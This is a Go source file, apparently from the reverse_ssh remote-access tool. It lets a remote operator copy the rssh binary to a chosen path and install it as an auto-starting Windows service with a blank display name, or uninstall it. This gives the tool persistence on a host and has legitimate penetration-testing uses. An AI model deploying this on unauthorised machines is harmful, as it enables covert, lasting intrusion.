//go:build windows

package subsystems

import (
	"errors"
	"fmt"
	"io/ioutil"
	"os"

	"github.com/NHAS/reverse_ssh/internal/terminal"
	"golang.org/x/crypto/ssh"
	"golang.org/x/sys/windows/svc/eventlog"
	"golang.org/x/sys/windows/svc/mgr"
)

type service bool

func (s *service) Execute(line terminal.ParsedLine, connection ssh.Channel, subsystemReq *ssh.Request) error {
	subsystemReq.Reply(true, nil)

	name, err := line.GetArgString("name")
	if err == terminal.ErrFlagNotSet {
		name = "rssh"
	}

	installPath, err := line.GetArgString("install")
	if err != terminal.ErrFlagNotSet {
		flagErr := err

		currentPath, err := os.Executable()
		if err != nil {
			return errors.New("Unable to find the current binary location: " + err.Error())
		}

		//If no argument was supplied for install
		if flagErr != nil {
			installPath = currentPath

		} else if installPath != currentPath {

			input, err := ioutil.ReadFile(currentPath)
			if err != nil {
				return err
			}

			err = ioutil.WriteFile(installPath, input, 0644)
			if err != nil {
				return err
			}

		}

		return s.installService(name, installPath)
	}

	if line.IsSet("uninstall") {
		return s.uninstallService(name)
	}

	return errors.New(terminal.MakeHelpText(
		"service [MODE] [ARGS|...]",
		"The service submodule can install or removed the rssh binary as a service",
		"\t--name\tName of service to act on, defaults to 'rssh'",
		"\t--install\tOptionally, when supplied an argument rssh will copy itself there",
		"\t--uninstall\tWill uninstall the service set by name",
	))
}

func (s *service) installService(name, location string) error {

	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()

	newService, err := m.OpenService(name)
	if err == nil {
		newService.Close()
		return fmt.Errorf("service %s already exists", name)
	}

	newService, err = m.CreateService(name, location, mgr.Config{DisplayName: "", StartType: mgr.StartAutomatic})
	if err != nil {
		return err
	}
	defer newService.Close()
	err = eventlog.InstallAsEventCreate(name, eventlog.Error|eventlog.Warning|eventlog.Info)
	if err != nil {
		newService.Delete()
		return fmt.Errorf("SetupEventLogSource() failed: %s", err)
	}

	err = newService.Start()
	if err != nil {
		return fmt.Errorf("Starting rssh has failed: %s", err)
	}
	return nil

}

func (s *service) uninstallService(name string) error {
	m, err := mgr.Connect()
	if err != nil {
		return err
	}
	defer m.Disconnect()
	serviceToRemove, err := m.OpenService(name)
	if err != nil {
		return fmt.Errorf("service %s is not installed", name)
	}
	defer serviceToRemove.Close()
	err = serviceToRemove.Delete()
	if err != nil {
		return err
	}

	eventlog.Remove(name)
	return nil

}
